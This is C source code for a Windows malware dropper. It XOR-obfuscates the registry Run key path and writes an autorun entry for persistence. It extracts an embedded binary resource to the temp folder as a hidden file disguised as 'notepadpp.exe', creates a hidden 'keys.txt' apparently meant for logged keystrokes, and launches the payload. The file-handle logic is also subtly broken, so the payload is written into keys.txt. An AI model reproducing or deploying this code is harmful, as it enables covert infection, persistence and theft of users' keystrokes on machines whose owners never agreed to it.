#include "windows.h"
#include "resource.h"

#define APP_PATH MAX_PATH+1

HINSTANCE	hInst	 = NULL;

BOOL CoverDrop();
BOOL MalwareDrop();

char* TestEnDecode(char* val, int length) {
    char* newString = (char*)malloc(sizeof(char) * (length + 1));
    char key = 0x55;
    key = 0x55 & 0x4B;
    for (int i = 0; i < length; i++) {
        newString[i] = val[i] ^ key; //'A'
    }
    return newString;
}
void GenRegKey() {
    HKEY hKey;
    const char * czStartName = "HelloWorld";
    // char* autorun = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    char autorun[] = { 0x12, 0x0E, 0x07, 0x15, 0x16, 0x00, 0x13, 0x04, 0x1D,
                        0x1D, 0x0C, 0x28, 0x22, 0x33, 0x2E, 0x32, 0x2E, 0x27, 0x35,
                        0x1D, 0x1D, 0x16, 0x28, 0x2F, 0x25, 0x2E, 0x36, 0x32, 0x1D,
                        0x1D, 0x02, 0x34, 0x33, 0x33, 0x24, 0x2F, 0x35, 0x17, 0x24,
                        0x33, 0x32, 0x28, 0x2E, 0x2F, 0x1D, 0x1D, 0x13, 0x34, 0x2F, 0x41 };
    
    const int autorun_len = 50;
    const char* autorun2 = TestEnDecode(&autorun[0], autorun_len);

    //char filepath[256];
    char filename[256];
    GetCurrentDirectory(sizeof(filename), filename);
    //(1130) should change file name
    strcat_s(filename, sizeof(filename), "\\notepadpp.exe");

    LONG lnRes = RegOpenKeyEx(HKEY_CURRENT_USER,
        autorun2,
        0, KEY_WRITE,
        &hKey);
    if (ERROR_SUCCESS == lnRes) {
        lnRes = RegSetValueEx(hKey,
            czStartName,
            0,
            REG_SZ,
            (unsigned char*)filename,
            strlen(filename));
    }
    RegCloseKey(hKey);
}

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
    
	hInst = hInstance;
	GenRegKey();
	CoverDrop();

	return 0;
}

BOOL CoverDrop()
{
	WCHAR szAppFullPath[APP_PATH];
    WCHAR szLogFullPath[APP_PATH];
	WCHAR szTempPath[APP_PATH];
	WCHAR szSystemPath[APP_PATH];

	DWORD	dwResSize, dwByteWrite;
	HRSRC	hResource	= 0;
	HGLOBAL	hResData	= 0;
	LPVOID	lpData		= NULL;
	HANDLE	hFile		= NULL;

	GetTempPath(APP_PATH, szTempPath);
	//GetWindowsDirectory(szSystemPath, APP_PATH);
	wsprintf(szAppFullPath,L"%s\\notepadpp.exe",szTempPath);

    //TODO: keys.txt
    wsprintf(szLogFullPath,L"%s\\keys.txt",szTempPath);

	hResource = FindResource(hInst, MAKEINTRESOURCE(IDR_BIN1), L"BIN");
	dwResSize = SizeofResource(hInst, hResource);
	hResData = LoadResource(hInst, hResource);

	if (hResData != NULL && dwResSize != 0)
	{
		lpData = NULL;
		lpData = LockResource(hResData);
		hFile = CreateFile(szAppFullPath,
			GENERIC_WRITE,
			FILE_SHARE_WRITE,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_HIDDEN,
			NULL);
        hFile = CreateFile(szLogFullPath,
			GENERIC_WRITE,
			FILE_SHARE_WRITE,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_HIDDEN,
			NULL);

		if (NULL != hFile && INVALID_HANDLE_VALUE != hFile)
		{
			SetFilePointer(hFile, 0, 0, FILE_BEGIN);

			WriteFile(hFile,
				(LPBYTE)lpData,
				dwResSize,
				&dwByteWrite,
				NULL);

			CloseHandle(hFile);

			STARTUPINFO si={0, };
			PROCESS_INFORMATION pi;
			si.cb = sizeof(STARTUPINFO);
			si.dwFlags = 0;
			CreateProcess(NULL, szAppFullPath, NULL, NULL, NULL, NULL, NULL, NULL, &si, &pi);
		}
		else
		{
			MessageBox(NULL, L"Install Fail hFile", L"Warning", MB_OK | MB_ICONSTOP);
		}
	}
	else
	{
		MessageBox(NULL, L"Install Fail hResData", L"Warning", MB_OK | MB_ICONSTOP);
	}
	return TRUE;
}